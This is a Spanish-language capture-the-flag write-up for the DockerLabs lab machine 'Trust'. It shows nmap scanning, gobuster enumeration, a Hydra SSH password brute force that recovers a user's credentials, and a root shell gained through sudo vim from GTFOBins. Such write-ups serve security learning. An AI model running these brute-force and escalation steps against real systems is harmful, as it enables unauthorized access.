# TRUST
## INDICACIONES PREVIAS
* Sistema operativo: Kali Linux
* Terminal: ZSH Powerlevel10K
* Utilidad mkt definida en la zshrc para la creación automática de directorios nmap, content y scripts.
* Cat aliseado como bat.
## DESPLIEGUE DE MÁQUINA
1. Descargarla desde la plataforma DockerLabs.
2. En mi caso, yo me creo un directorio con el nombre de la máquina para tenerlo todo más organizado, por lo que mediante el comando mv (`mv ~/Downloads/<máquina.zip> ~/Desktop/Máquinas/Dockerlabs/<máquina>`) la moveré de descargas a la nueva ubicación.
3. Una vez hecho esto, la descomprimiremos mediante unzip <máquina.zip> y se nos creará un ejecutable .tar
4. Por último, la desplegaremos mediante sudo bash auto_deploy.sh <máquina.tar> y se nos proporcionará una IP, en mi caso 172.18.0.2.
## EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS
Primero comprobaremos la conectividad con la máquina. 
```ruby
> ping -c1 172.18.0.2
PING 172.17.0.2 (172.18.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=4.45 ms

--- 172.18.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 4.447/4.447/4.447/0.000 ms
```

* c1 (count 1) para indicar que solo queremos mandar un paquete ICMP y después termine de enviar paquetes. 

* De aquí podemos observar que: 
  * Se ha enviado un paquete y se ha recibido de vuelta, por lo que hay conectividad con la máquina.
  * Tenemos un ttl = 64, lo que quiere decir que nos encontramos ante un sistema Linux.

Una vez visto que tenemos conectividad comenzaremos con el escaneo de puertos.  Para ello ejecutaremos:
```ruby
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts
```
* Con -p- escaneamos el rango completo de puertos (65535).
* Con --open añadimos que de esos solo nos interesan los abiertos.
* Con -sS seleccionamos que el tipo de escaneo será de tipo SYN Scan. Este se caracteriza por ser rápido y sigiloso puesto que no se completa el three-way handshake.
  * Según la respuesta del puerto, Nmap deduce su estado:
    * SYN/ACK recibido → el puerto está abierto.
    * RST (Reset) recibido → el puerto está cerrado.
    * Sin respuesta o ICMP error → el puerto está filtrado (por firewall).
  * Si el puerto estaba abierto (SYN/ACK), Nmap no completa la conexión: envía un RST para interrumpir el handshake y no dejar un rastro evidente.
* Con --min-rate 5000 indicamos que queremos un envío de 5000 paquetes por segundo.
* Con -vvv (triple verbose) se muestra por consola la información detallada y actualizada al momento.
* Con -n indicaremos que no queremos resolución DNS, trabajaremos directamente con direcciones IP.
* Con -Pn queremos que no se haga ping al host antes de comenzar el escaneo, asumiendo que está activo.
* Por último, con -oG exportamos la evidencia en un archivo con formato grepeable para facilitar su procesamiento en auditorias.

Para simplificarnos el visionado de los puertos abiertos directamente abriremos el archivo *allPorts*.
```ruby
❯ cat allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Sun Sep  7 20:59:54 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 172.18.0.2
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 172.18.0.2 () Status: Up
   4   │ Host: 172.18.0.2 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///    Ignored State: closed (65533)
   5   │ # Nmap done at Sun Sep  7 20:59:56 2025 -- 1 IP address (1 host up) scanned in 2.38 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Una vez localizados los puertos abiertos, continuaremos con el escaneo específico de los mismos para ver que servicios y versiones corren por ellos.
```bash
❯ nmap -p22,80 -sCV 172.18.0.2 -oN targeted
```

* El parámetro -sCV es una conjunción de los parámetros:
  * -sC: Ejecuta los scripts de Nmap por defecto (Default Scripts) para el host/puerto para detectar vulnerabilidades básicas, información de banners, servicios públicos, etc..
  * -sV: Detecta la versión del servicio que corre en cada puerto abierto.
* Con -oN exportamos la evidencia en un archivo con formato Nmap para dejarlo registrado.

Al igual que antes, para que la visualización de toda la información sea más cómoda, la analizaremos desde el archivo *targeted* que acabamos de generar.
```java
❯ cat targeted -l java
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targeted
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Sun Sep  7 21:01:35 2025 as: /usr/lib/nmap/nmap --privileged -p22,80 -sCV -oN targeted 172.18.0.2
   2   │ Nmap scan report for 172.18.0.2
   3   │ Host is up (0.00s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
   9   │ |_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
  10   │ 80/tcp open  http    Apache httpd 2.4.57 ((Debian))
  11   │ |_http-title: Apache2 Debian Default Page: It works
  12   │ |_http-server-header: Apache/2.4.57 (Debian)
  13   │ MAC Address: 02:42:AC:12:00:02 (Unknown)
  14   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  15   │ 
  16   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  17   │ # Nmap done at Sun Sep  7 21:01:42 2025 -- 1 IP address (1 host up) scanned in 7.29 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
En el puerto 22 nos encontramos con un servicio *OpenSSH* actualizado a una versión relativamente reciente, lo que indica que no presenta ninguna vulnerabilidad conocida (versiones < 7.7) por lo que nos centraremos primero en el servicio HTTP del puerto 80.  Para ello nos dirigiremos al navegador y escribiremos la dirección IP. 

![Panel de Apache](https://github.com/JavieRR13/WriteUps/blob/1c1a5bf7b5a14bf09e12fc52180fde1e3514e8f0/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_Apache.png)

Tras acceder a la web nos encontramos con un panel de Apache por defecto del cual, a simple vista, no parece que vayamos a sacar mucho.  Como tampoco tenemos ningún usuario de sistema válido para intentar fuerza bruta sobre el servicio SSH, probaremos a buscar recursos, directorios o subdominios que pueda permanecer ocultos con la herramienta [gobuster](https://github.com/OJ/gobuster). 
```java
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 'http://172.18.0.2' -x .php,.py,.txt,.sh
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,py,txt,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/secret.php           (Status: 200) [Size: 927]
/server-status        (Status: 403) [Size: 275]
Progress: 1038205 / 1038205 (100.00%)
===============================================================
Finished
===============================================================
```
* Con dir indicamos que queremos el modo escaneo de directorios.
* Con -w indicamos el diccionario a utilizar, en mi caso uno de [Seclists](https://github.com/danielmiessler/SecLists).
* Con -u indicamos la url.
* Con -x seleccionamos la extensión de archivos que queremos buscar.

Podemos observar que, tras el escaneo que duró unos pocos segundos, se nos ha devuelto un status code 200 en el archivo *secret.php*. Con esto, nos dirigiremos al navegador para comprobar que es.
![Mensaje](https://github.com/JavieRR13/WriteUps/blob/8f7742950694bd6cce9ba76009eb43a6e12d5b34/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_Mensaje.png)
Nos encontramos frente a una página en blanco con un mensaje con un nombre en el centro.  Además, inspeccionando el código fuente de la página no parece haber nada sospechoso, por lo que solo podemos interpretar que este nombre pueda ser un usuario válido de sistema y probarlo en el servicio SSH utilizando fuerza bruta con la herramienta [Hydra](https://github.com/vanhauser-thc/thc-hydra) y el diccionario de [rockyou](https://github.com/topics/rockyou-wordlist).
```ruby
❯ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 10:56:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-08 10:56:28
```
* Con -l seleccionamos el usuario.
* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.
Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *mario*.
Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
```ruby
❯ ssh mario@172.18.0.2
mario@172.18.0.2's password: 
Linux 99ebdb36daec 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
mario@99ebdb36daec:~$ whoami
mario
```
Una vez dentro de la máquina víctima, vamos a intentar listar todos los privilegios de sudo del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo. 
```ruby
mario@99ebdb36daec:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 99ebdb36daec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 99ebdb36daec:
    (ALL) /usr/bin/vim
```
Sabiendo que podemos ejecutar Vim[^1] con permisos de administrador, podemos buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) alguna forma de establecer una shell remota, puesto que esta se ejecutará con los permisos del usuario que la haya lanzado. 
![GTFOBins vim](https://github.com/JavieRR13/WriteUps/blob/6be73eb8c1de22d9b38e2720c90c945007edde78/DockerLabs/Muy%20f%C3%A1cil/Trust/Im%C3%A1genes/Trust_GTFOBinsvim.png)
```ruby
mario@99ebdb36daec:~$ sudo vim -c ':!/bin/sh'

# whoami
root
# 
```
🥳CONSEGUIDO, SOMOS ROOT🥳
[^1]: Vim es un editor de texto para sistemas Unix/Linux que, al poder ejecutarse con sudo, se convierte en una vía de escalada de privilegios porque permite lanzar comandos de sistema desde dentro del editor (por ejemplo con :!bash), lo que posibilita abrir una shell con permisos de root.
